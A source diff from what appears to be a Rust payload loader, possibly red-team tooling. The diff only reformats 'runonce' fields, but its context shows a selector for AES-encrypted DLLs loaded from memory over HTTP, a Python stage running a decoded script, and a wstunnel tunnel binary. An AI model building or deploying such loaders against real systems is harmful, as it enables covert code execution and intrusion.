@@ -131,7 +131,7 @@ fn main() {
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
-            runonce:false
+            runonce: false,
         })];
     } else if payload == "dll2".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AES]");
@@ -146,7 +146,7 @@ fn main() {
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
-            runonce:false
+            runonce: false,
         })];
     } else if payload == "2dll".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AES]");
@@ -162,7 +162,7 @@ fn main() {
                 }),
                 dll_entrypoint: String::from("DllInstall"),
                 thread: true,
-                runonce:false
+                runonce: false,
             }),
             Payload::DllFromMemory(DllFromMemory {
                 link: Link::HTTP(HTTPLink {
@@ -173,7 +173,7 @@ fn main() {
                 }),
                 dll_entrypoint: String::from("DllInstall"),
                 thread: true,
-                runonce:false
+                runonce: false,
             }),
         ];
     } else if payload == "py".to_string() {
@@ -217,7 +217,7 @@ exec(decoded_script)
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
-            runonce:false
+            runonce: false,
         })];
     } else if payload == "memdll".to_string() {
         info!("[+] Loader type choice: DllFromMemory [AES] from memory slot");
@@ -232,8 +232,7 @@ exec(decoded_script)
             }),
             dll_entrypoint: String::from("DllInstall"),
             thread: false,
-            runonce:false
-
+            runonce: false,
         })];
     } else if payload == "wstunnel".to_string() {
         // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
